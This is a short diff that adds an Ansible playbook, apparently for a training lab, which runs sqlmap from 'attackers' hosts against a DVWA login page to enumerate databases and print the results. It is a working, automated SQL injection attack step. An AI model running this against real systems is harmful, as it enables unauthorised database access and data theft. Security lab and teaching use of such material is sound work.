@@ -1,0 +1,19 @@
+---
+- name: SQL Injection Attack
+  hosts: attackers
+  gather_facts: no
+  
+  tasks:
+    - name: Run SQLMap from Kali
+      shell: |
+        sqlmap -u "http://{{ target_ip }}/dvwa/login.php" \
+               --data="username=admin&password=test" \
+               --batch --dbs 2>&1 | head -n 50
+      register: output
+      ignore_errors: yes
+      async: 120
+      poll: 5
+    
+    - name: Results
+      debug:
+        var: output.stdout_lines
